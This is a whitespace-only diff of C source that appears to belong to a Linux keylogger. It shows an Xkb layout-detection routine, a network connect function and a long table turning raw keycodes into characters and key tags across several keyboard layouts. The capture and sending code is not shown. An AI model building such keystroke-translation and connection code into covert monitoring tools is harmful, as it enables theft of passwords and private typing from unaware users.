@@ -16,14 +16,14 @@ char* get_kb_symbols(void)
  * 		unsigned short     flags;        // private to Xkb, do not modify 
  *  		unsigned short     device_spec;  // device of interest 
  *  		KeyCode            min_key_code; // minimum keycode for device 
- 	  	KeyCode            max_key_code; // maximum keycode for device 
- 	  	XkbControlsPtr     ctrls;        // controls 
+ *	  	KeyCode            max_key_code; // maximum keycode for device 
+ *	  	XkbControlsPtr     ctrls;        // controls 
  *  		XkbServerMapPtr    server;       // server keymap 
- 	  	XkbClientMapPtr    map;          // client keymap 
+ *	  	XkbClientMapPtr    map;          // client keymap 
  *  		XkbIndicatorPtr    indicators;   // indicator map 
- 	  	XkbNamesPtr        names;        // names for all components       <--[This is our champion!]
+ *	  	XkbNamesPtr        names;        // names for all components       <--[This is our champion!]
  *  		XkbCompatMapPtr    compat;       // compatibility map 
- 	  	XkbGeometryPtr     geom;         // physical geometry of keyboard 
+ *	  	XkbGeometryPtr     geom;         // physical geometry of keyboard 
  *	} XkbDescRec, *XkbDescPtr;
  */
 	Display *display;
@@ -199,10 +199,10 @@ char* get_kb_layout(char *keycodes, char *symbols)
    //french, deutch, Colemak, Dvorak
    if(strstr(keycodes, "qwerty"))
    {
-   		if(strstr(symbols, "it")){ return "it";}
-   		else if(strstr(symbols, "us")){ return "us";}
-		else if(strstr(symbols, "es")){return "es";}
-		else return "unknown";
+   	if(strstr(symbols, "it")){ return "it";}
+   	else if(strstr(symbols, "us")){ return "us";}
+	else if(strstr(symbols, "es")){return "es";}
+	else return "unknown";
    }
    else if(strstr(symbols, "fr")){ return "fr";}
    else if(strstr(symbols, "de")){return "de";}
@@ -284,12 +284,12 @@ int conn(char *addr, char *port)
 	struct addrinfo hints, *result, *rp;
 
 	memset(&hints,0,sizeof(struct addrinfo));
-			hints.ai_canonname = NULL;
-			hints.ai_addr = NULL;
-			hints.ai_next = NULL;
-			hints.ai_socktype = 0; 		 //TCP  && UDP
-			hints.ai_family = AF_UNSPEC; 	 //IPv4 && IPv6
-			hints.ai_flags = AI_NUMERICSERV; //Interpret service as a numeric port number
+		hints.ai_canonname = NULL;
+		hints.ai_addr = NULL;
+		hints.ai_next = NULL;
+		hints.ai_socktype = 0; 		 //TCP  && UDP
+		hints.ai_family = AF_UNSPEC; 	 //IPv4 && IPv6
+		hints.ai_flags = AI_NUMERICSERV; //Interpret service as a numeric port number
 
 	if(getaddrinfo(addr, port, &hints, &result) ==-1)
 	{
@@ -324,13 +324,13 @@ int conn(char *addr, char *port)
 
 /*********************************************
  *  Get the keystroke corresponding to code. *
- *											 *
- *  Supported Layouts:						 *
- *						-QWERTY:(us,it,es)   *
- *  					-AZERTY: fr          *
- *  					-QWERTZ: de          *
- *  					-COLEMAK             *
- *  					-DVORAK: us          *
+ *					     *
+ *  Supported Layouts:		       	     *
+ *			-QWERTY:(us,it,es)   *
+ *  			-AZERTY: fr          *
+ *  			-QWERTZ: de          *
+ *  			-COLEMAK             *
+ *  			-DVORAK: us          *
  ********************************************/
 
 char* code_to_str(char* layout, int code)
@@ -348,413 +348,412 @@ char* code_to_str(char* layout, int code)
 	{
 		//Letters:
 		case KEY_A: 
-					switch(lyt)
-					{
-						case FR: return "q"; break;
-						default: return "a"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case FR: return "q"; break;
+					default: return "a"; break;
+				}
+				break;
 		case KEY_B: 
-					switch(lyt)
-					{
-						case DVORAK: return "x"; break;
-						default: return "b"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case DVORAK: return "x"; break;
+					default: return "b"; break;
+				}
+				break;
 		case KEY_C: 
-					switch(lyt)
-					{
-						case DVORAK: return "j"; break;
-						default: return "c"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case DVORAK: return "j"; break;
+					default: return "c"; break;
+				}
+				break;
 		case KEY_D: 
-					switch(lyt)
-					{
-						case DVORAK: return "e"; break;
-						case COLEMAK: return "s"; break; 
-						default:  return "d"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case DVORAK: return "e"; break;
+					case COLEMAK: return "s"; break; 
+					default:  return "d"; break;
+				}
+				break;
 		case KEY_E: 
-					switch(lyt)
-					{
-						case DVORAK: return "."; break;
-						case COLEMAK: return "f"; break; 
-						default: return "e"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case DVORAK: return "."; break;
+					case COLEMAK: return "f"; break; 
+					default: return "e"; break;
+				}
+				break;
 		case KEY_F: 
-					switch(lyt)
-					{
-						case DVORAK: return "u"; break;
-						case COLEMAK: return "t"; break; 
-						default:  return "f"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case DVORAK: return "u"; break;
+					case COLEMAK: return "t"; break; 
+					default:  return "f"; break;
+				}
+				break;
 		case KEY_G: 
-					switch(lyt)
-					{
-						case DVORAK: return "i"; break;
-						case COLEMAK: return "d"; break; 
-						default:  return "g"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case DVORAK: return "i"; break;
+					case COLEMAK: return "d"; break; 
+					default:  return "g"; break;
+				}
+				break;
 		case KEY_H: 
-					switch(lyt)
-					{
-						case DVORAK: return "d"; break;
-						default: return "h"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case DVORAK: return "d"; break;
+					default: return "h"; break;
+				}
+				break;
 		case KEY_I: 
-					switch(lyt)
-					{
-						case DVORAK: return "c"; break;
-						case COLEMAK: return "u"; break; 
-						default:  return "i"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case DVORAK: return "c"; break;
+					case COLEMAK: return "u"; break; 
+					default:  return "i"; break;
+				}
+				break;
 		case KEY_J: 
-					switch(lyt)
-					{
-						case DVORAK: return "h"; break;
-						case COLEMAK: return "n"; break; 
-						default:  return "j"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case DVORAK: return "h"; break;
+					case COLEMAK: return "n"; break; 
+					default:  return "j"; break;
+				}
+				break;
 		case KEY_K: 
-					switch(lyt)
-					{
-						case DVORAK: return "t"; break;
-						case COLEMAK: return "e"; break; 
-						default:  return "k"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case DVORAK: return "t"; break;
+					case COLEMAK: return "e"; break; 
+					default:  return "k"; break;
+				}
+				break;
 		case KEY_L: 
-					switch(lyt)
-					{
-						case DVORAK: return "n"; break;
-						case COLEMAK: return "i"; break; 
-						default:  return "l"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case DVORAK: return "n"; break;
+					case COLEMAK: return "i"; break; 
+					default:  return "l"; break;
+				}
+				break;
 		case KEY_M: 
-					switch(lyt)
-					{
-						case FR: return ",";
-						default: return "m"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case FR: return ",";
+					default: return "m"; break;
+				}
+				break;
 		case KEY_N: 
-					switch(lyt)
-					{
-						case DVORAK: return "b"; break;
-						case COLEMAK: return "k"; break; 
-						default:  return "n"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case DVORAK: return "b"; break;
+					case COLEMAK: return "k"; break; 
+					default:  return "n"; break;
+				}
+				break;
 		case KEY_O: 
-					switch(lyt)
-					{
-						case DVORAK: return "r"; break;
-						case COLEMAK: return "y"; break; 
-						default:  return "o"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case DVORAK: return "r"; break;
+					case COLEMAK: return "y"; break; 
+					default:  return "o"; break;
+				}
+				break;
 		case KEY_P: 
-					switch(lyt)
-					{
-						case DVORAK: return "l"; break;
-						case COLEMAK: return ";"; break; 
-						default:  return "p"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case DVORAK: return "l"; break;
+					case COLEMAK: return ";"; break; 
+					default:  return "p"; break;
+				}
+				break;
 		case KEY_Q: 
-					switch(lyt)
-					{
-						case DVORAK: return "\'"; break;
-						case FR: return "a"; break;
-						default: return "q"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case DVORAK: return "\'"; break;
+					case FR: return "a"; break;
+					default: return "q"; break;
+				}
+				break;
 		case KEY_R: 
-					switch(lyt)
-					{
-						case DVORAK:
-						case COLEMAK: return "p"; break; 
-						default: return "r"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case DVORAK:
+					case COLEMAK: return "p"; break; 
+					default: return "r"; break;
+				}
+				break;
 		case KEY_S: 
-					switch(lyt)
-					{
-						case DVORAK: return "o"; break;
-						case COLEMAK: return "r"; break; 
-						default:  return "s"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case DVORAK: return "o"; break;
+					case COLEMAK: return "r"; break; 
+					default:  return "s"; break;
+				}
+				break;
 		case KEY_T: 
-					switch(lyt)
-					{
-						case DVORAK: return "y"; break;
-						case COLEMAK: return "g"; break; 
-						default:  return "t"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case DVORAK: return "y"; break;
+					case COLEMAK: return "g"; break; 
+					default:  return "t"; break;
+				}
+				break;
 		case KEY_U: 
-					switch(lyt)
-					{
-						case DVORAK: return "g"; break;
-						case COLEMAK: return "l"; break; 
-						default:  return "u"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case DVORAK: return "g"; break;
+					case COLEMAK: return "l"; break; 
+					default:  return "u"; break;
+				}
+				break;
 		case KEY_V: 
-					switch(lyt)
-					{
-						case DVORAK: return "k"; break;
-						default: return "v"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case DVORAK: return "k"; break;
+					default: return "v"; break;
+				}
+				break;
 		case KEY_W: 
-					switch(lyt)
-					{
-						case DVORAK: return ","; break;
-						case FR: return "z"; break;
-						default: return "w"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case DVORAK: return ","; break;
+					case FR: return "z"; break;
+					default: return "w"; break;
+				}
+				break;
 		case KEY_X: 
-					switch(lyt)
-					{
-						case DVORAK: return "q"; break;
-						default: return "x"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case DVORAK: return "q"; break;
+					default: return "x"; break;
+				}
+				break;
 		case KEY_Y: 
-					switch(lyt)
-					{
-						case DVORAK: return "f"; break;
-						case COLEMAK: return "j"; break;
-						case DE: return "z"; break;
-						default: return "y"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case DVORAK: return "f"; break;
+					case COLEMAK: return "j"; break;
+					case DE: return "z"; break;
+					default: return "y"; break;
+				}
+				break;
 		case KEY_Z: 
-					switch(lyt)
-					{
-						case DVORAK: return ";"; break;
-						case DE: return "y"; break;
-						case FR: return "w"; break;
-						default: return "z"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case DVORAK: return ";"; break;
+					case DE: return "y"; break;
+					case FR: return "w"; break;
+					default: return "z"; break;
+				}
+				break;
 		//Numbers:
 		case KEY_0: 
-					switch(lyt)
-					{
-						case FR: return "à"; break;
-						default: return "0"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case FR: return "à"; break;
+					default: return "0"; break;
+				}
+				break;
 		case KEY_1: 
-					switch(lyt)
-					{
-						case FR: return "&"; break;
-						default: return "1"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case FR: return "&"; break;
+					default: return "1"; break;
+				}
+				break;
 		case KEY_2: 
-					switch(lyt)
-					{
-						case FR: return "é"; break;
-						default: return "2"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case FR: return "é"; break;
+					default: return "2"; break;
+				}
+				break;
 		case KEY_3: 
-					switch(lyt)
-					{
-						case FR: return "\""; break;
-						default:  return "3"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case FR: return "\""; break;
+					default:  return "3"; break;
+				}
+				break;
 		case KEY_4: 
-					switch(lyt)
-					{
-						case FR: return "\'"; break;
-						default:   return "4"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case FR: return "\'"; break;
+					default:   return "4"; break;
+				}
+				break;
 		case KEY_5: 
-					switch(lyt)
-					{
-						case FR: return "("; break;
-						default:   return "5"; break;
-
-					}
-					break;
+				switch(lyt)
+				{
+					case FR: return "("; break;
+					default:   return "5"; break;
+				}
+				break;
 		case KEY_6: 
-					switch(lyt)
-					{
-						case FR: return "-"; break;
-						default: return "6"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case FR: return "-"; break;
+					default: return "6"; break;
+				}
+				break;
 		case KEY_7: 
-					switch(lyt)
-					{
-						case FR: return "è"; break;
-						default: return "7"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case FR: return "è"; break;
+					default: return "7"; break;
+				}
+				break;
 		case KEY_8: 
-					switch(lyt)
-					{
-						case FR: return "_"; break;
-						default: return "8"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case FR: return "_"; break;
+					default: return "8"; break;
+				}
+				break;
 		case KEY_9: 
-					switch(lyt)
-					{
-						case FR: return "ç"; break;
-						default: return "9"; break;
-					}
-					break;
+				switch(lyt)
+				{
+					case FR: return "ç"; break;
+					default: return "9"; break;
+				}
+				break;
 		//Special chars:
 		case KEY_ESC: return "[ESC]"; break;
 		case KEY_BACKSPACE: return "[BACKSPACE]"; break;
  		case KEY_TAB: return "[TAB]"; break;
 		case KEY_MINUS: 
-						switch(lyt)
-						{
-							//case COLEMAK: return "="; break;
-							case DVORAK: return "["; break;
-							case DE: return "ß"; break;
-							case FR: return ")"; break;
-							case ES: 
-							case IT: return "\'"; break;
-							default: return "-"; break;
-						}
-						break;
+				switch(lyt)
+				{
+					//case COLEMAK: return "="; break;
+					case DVORAK: return "["; break;
+					case DE: return "ß"; break;
+					case FR: return ")"; break;
+					case ES: 
+					case IT: return "\'"; break;
+					default: return "-"; break;
+				}
+				break;
 		case KEY_EQUAL: 
-						switch(lyt)
-						{ 	
-							//case COLEMAK: return "="; break;
-							//case FR: return "="; break;
-							case DVORAK: return "]"; break;
-							case DE: return "´";
-							case ES: return "¡"; break;
-							case IT: return "ì"; break;
-							default: return "="; break;
-						}
-						break;
+				switch(lyt)
+				{ 	
+					//case COLEMAK: return "="; break;
+					//case FR: return "="; break;
+					case DVORAK: return "]"; break;
+					case DE: return "´";
+					case ES: return "¡"; break;
+					case IT: return "ì"; break;
+					default: return "="; break;
+				}
+				break;
 		case KEY_LEFTBRACE: 
-						switch(lyt)
-						{
-							//case COLEMAK: return "["; break;
-							case DVORAK: return "/"; break;
-							case DE: return "ü"; break;
-							case FR: return "^"; break;
-							case ES: return "`"; break;
-							case IT: return "è"; break;
-							default: return "["; break;
-						}
-						break;
+				switch(lyt)
+				{
+					//case COLEMAK: return "["; break;
+					case DVORAK: return "/"; break;
+					case DE: return "ü"; break;
+					case FR: return "^"; break;
+					case ES: return "`"; break;
+					case IT: return "è"; break;
+					default: return "["; break;
+				}
+				break;
 		case KEY_RIGHTBRACE: 
-						switch(lyt)
-						{
-							//case COLEMAK: return "]"; break;
-							case DVORAK: return "="; break;
-							case FR: return "$"; break;
-							case DE:
-							case ES:
-							case IT: return "+"; break;
-							default: return "]"; break;
-						}
-						break;
+				switch(lyt)
+				{
+					//case COLEMAK: return "]"; break;
+					case DVORAK: return "="; break;
+					case FR: return "$"; break;
+					case DE:
+					case ES:
+					case IT: return "+"; break;
+					default: return "]"; break;
+				}
+				break;
 		case KEY_ENTER: return "[ENTER]"; break;
 		case KEY_LEFTCTRL: return "[LEFTCTRL]"; break;
 		case KEY_COMPOSE: return "[MENU]"; break;
 		case KEY_LEFTMETA: return "[WIN]"; break;
 		case KEY_SEMICOLON: 
-						switch(lyt)
-						{
-							case DVORAK: return "s"; break;
-							case COLEMAK: return "o"; break;
-							case DE: return "ö"; break;
-							case FR: return "m"; break;
-							case ES: return "ñ"; break;
-							case IT: return "ò"; break;
-							default: return ";"; break;
-						}
-						break;
+				switch(lyt)
+				{
+					case DVORAK: return "s"; break;
+					case COLEMAK: return "o"; break;
+					case DE: return "ö"; break;
+					case FR: return "m"; break;
+					case ES: return "ñ"; break;
+					case IT: return "ò"; break;
+					default: return ";"; break;
+				}
+				break;
 		case KEY_APOSTROPHE: 
-						switch(lyt)
-						{
-							case DVORAK: return "-"; break;
-							case COLEMAK: return "\'"; break;
-							case DE: return "ä"; break;
-							case FR: return "ù"; break;
-							case ES: return "´"; break;
-							case IT: return "à"; break;
-							default: return "'"; break;
-						}
-						break;
+				switch(lyt)
+				{
+					case DVORAK: return "-"; break;
+					case COLEMAK: return "\'"; break;
+					case DE: return "ä"; break;
+					case FR: return "ù"; break;
+					case ES: return "´"; break;
+					case IT: return "à"; break;
+					default: return "'"; break;
+				}
+				break;
 		case KEY_GRAVE: 
-						switch(lyt)
-						{
-							//case COLEMAK: return "`"; break;
-							//case DVORAK: return "`"; break;
-							case DE: return "^"; break;
-							case FR: return "²"; break;
-							case ES: return "º"; break;
-							case IT: return "\\"; break;
-							default: return "`"; break;
-						}
-						break;
+				switch(lyt)
+				{
+					//case COLEMAK: return "`"; break;
+					//case DVORAK: return "`"; break;
+					case DE: return "^"; break;
+					case FR: return "²"; break;
+					case ES: return "º"; break;
+					case IT: return "\\"; break;
+					default: return "`"; break;
+				}
+				break;
 		case KEY_LEFTSHIFT: return "[LEFTSHIFT]"; break;
 		case KEY_BACKSLASH: 
-						switch(lyt)
-						{
-							//case DVORAK: return "\\"; break;
-							//case COLEMAK: return "\\"; break;
-							case DE: return "#"; break;
-							case FR: return "*"; break;
-							case ES: return "ç"; break;
-							case IT: return "ù"; break;
-							default: return "\\"; break;
-						}
-						break;
+				switch(lyt)
+				{
+					//case DVORAK: return "\\"; break;
+					//case COLEMAK: return "\\"; break;
+					case DE: return "#"; break;
+					case FR: return "*"; break;
+					case ES: return "ç"; break;
+					case IT: return "ù"; break;
+					default: return "\\"; break;
+				}
+				break;
 		case KEY_COMMA: 
-						switch(lyt)
-						{
-							case DVORAK: return "w"; break;
-							case FR:  return ";"; break;
-							default: return ","; break;
-						}
-						break;
+				switch(lyt)
+				{
+					case DVORAK: return "w"; break;
+					case FR:  return ";"; break;
+					default: return ","; break;
+				}
+				break;
 		case KEY_DOT: 
-						switch(lyt)
-						{
-							case DVORAK: return "v"; break;
-							case FR:  return ":"; 
-							default: break;return "."; break;
-						}
-						break;
+				switch(lyt)
+				{
+					case DVORAK: return "v"; break;
+					case FR:  return ":"; 
+					default: break;return "."; break;
+				}
+				break;
 		case KEY_SLASH: 
-						switch(lyt)
-						{
-							//case COLEMAK: return "/"; break;
-							case DVORAK: return "z"; break;
-							case FR: return "!"; break;
-							case DE:
-							case ES:
-							case IT: return "-"; break;
-							default: return "/"; break;
-						}
-						break;
+				switch(lyt)
+				{
+					//case COLEMAK: return "/"; break;
+					case DVORAK: return "z"; break;
+					case FR: return "!"; break;
+					case DE:
+					case ES:
+					case IT: return "-"; break;
+					default: return "/"; break;
+				}
+				break;
 		case KEY_102ND: return "<"; break;
 		case KEY_RIGHTSHIFT: return "[RIGHTSHIFT]"; break;
 		case KEY_KPASTERISK: return "[Keypad *]"; break;
